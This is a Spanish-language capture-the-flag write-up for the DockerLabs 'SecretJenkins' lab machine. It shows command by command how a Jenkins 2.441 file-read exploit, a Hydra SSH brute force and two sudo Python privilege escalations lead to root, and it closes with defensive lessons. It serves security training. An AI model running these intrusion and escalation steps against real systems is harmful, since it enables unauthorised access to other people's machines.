# SecretJenkins — DockerLabs

**Plataforma:** DockerLabs  
**Dificultad:** 🟢 Fácil  
**SO:** Linux  
**Autor de la máquina:** El Pingüino de Mario  
**Fecha de creación:** 11/05/2024  
**Técnicas:** Jenkins LFI · Searchsploit · Hydra · SSH · Python sudo abuse · Writable script

---

## Índice

1. [Despliegue y reconocimiento](#1-despliegue-y-reconocimiento)
2. [Enumeración Jenkins](#2-enumeración-jenkins)
3. [Explotación LFI — Jenkins 2.441](#3-explotación-lfi--jenkins-2441)
4. [Fuerza bruta SSH — Hydra](#4-fuerza-bruta-ssh--hydra)
5. [Escalada de privilegios — usuario pinguinito](#5-escalada-de-privilegios--usuario-pinguinito)
6. [Escalada final a root](#6-escalada-final-a-root)
7. [Lección aprendida](#7-lección-aprendida)

---

## 1. Despliegue y reconocimiento

Desplegamos el laboratorio:

```bash
sudo bash auto_deploy.sh secretjenkins.tar
```

> IP asignada: `172.17.0.2`

Comprobamos conectividad:

```bash
ping -c 4 172.17.0.2
```

Realizamos un escaneo rápido:

```bash
nmap -Pn 172.17.0.2
```

Resultado:

```text
22/tcp open ssh
8080/tcp open http-proxy
```

Enumeramos versiones:

```bash
nmap -p22,8080 -sCV -Pn 172.17.0.2
```

Resultado:

```text
OpenSSH 9.2p1 Debian
Jetty 10.0.18
Jenkins 2.441
```

---

## 2. Enumeración Jenkins

Accedemos al servicio web:

```text
http://172.17.0.2:8080
```

Encontramos un panel de login de Jenkins.

Inspeccionando las cabeceras HTTP identificamos:

```text
Jenkins 2.441
Jetty 10.0.18
```

---

## 3. Explotación LFI — Jenkins 2.441

Buscamos exploits disponibles:

```bash
searchsploit Jenkins 2.441
```

Resultado:

```text
Jenkins 2.441 - Local File Inclusion
```

Localizamos el exploit:

```bash
locate java/webapps/51993.py
```

Copiamos el exploit:

```bash
cp /usr/share/exploitdb/exploits/java/webapps/51993.py .
```

Comprobamos uso:

```bash
python3 51993.py
```

Ejecutamos el exploit:

```bash
python3 51993.py -u http://172.17.0.2:8080
```

Leemos `/etc/passwd`:

```text
/etc/passwd
```

Usuarios encontrados:

```text
bobby
pinguinito
jenkins
```

---

## 4. Fuerza bruta SSH — Hydra

Realizamos fuerza bruta contra el usuario `bobby`:

```bash
hydra -l bobby -P /usr/share/wordlists/rockyou.txt \
ssh://172.17.0.2
```

Resultado:

```text
login: bobby
password: chocolate
```

Accedemos mediante SSH:

```bash
ssh bobby@172.17.0.2
```

Comprobamos permisos sudo:

```bash
sudo -l
```

Resultado:

```text
(pinguinito) NOPASSWD: /usr/bin/python3
```

---

## 5. Escalada de privilegios — usuario pinguinito

Ejecutamos Python como el usuario `pinguinito`:

```bash
sudo -u pinguinito /usr/bin/python3
```

Dentro de la consola Python:

```python
import os
os.system("bash")
```

Verificamos usuario:

```bash
whoami
pinguinito
```

Comprobamos nuevamente privilegios sudo:

```bash
sudo -l
```

Resultado:

```text
(root) NOPASSWD: /usr/bin/python3 /opt/script.py
```

---

## 6. Escalada final a root

Eliminamos el script original:

```bash
cd /opt
rm -r script.py
```

Creamos uno nuevo:

```bash
touch script.py
```

Añadimos el payload:

```bash
echo 'import os; os.system("/bin/bash")' > script.py
```

Ejecutamos como root:

```bash
sudo /usr/bin/python3 /opt/script.py
```

Verificamos privilegios:

```bash
whoami
root
```

✅ Somos **root**.

---

## 7. Lección aprendida

| Vulnerabilidad | Impacto |
|----------------|---------|
| Jenkins vulnerable a LFI | Lectura arbitraria de archivos |
| Credenciales débiles SSH | Acceso remoto |
| Python ejecutable con sudo | Escalada horizontal |
| Script Python escribible | Escalada final a root |

**Para defenderse:**

- Mantener Jenkins actualizado.
- Aplicar políticas robustas de contraseñas.
- Restringir permisos sudo innecesarios.
- Proteger scripts ejecutados con privilegios elevados.

---

*Writeup por [Arabot](https://github.com/Caan31) · DockerLabs · 2025*  
*¿Te ha ayudado? Dale una ⭐ al repositorio.*
